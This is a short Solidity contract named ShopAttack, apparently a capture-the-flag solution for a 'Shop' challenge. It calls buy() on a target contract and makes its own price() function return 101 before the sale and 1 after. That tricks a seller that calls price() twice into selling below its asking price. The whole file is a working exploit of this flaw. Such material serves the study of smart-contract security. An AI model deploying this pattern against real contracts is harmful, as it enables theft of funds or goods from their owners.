// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopAttack {
    function attack(address _target) public {
        Shop(_target).buy();
    }

    function price() public view returns (uint256) {
        return Shop(msg.sender).isSold() ? 1 : 101;
    }
}
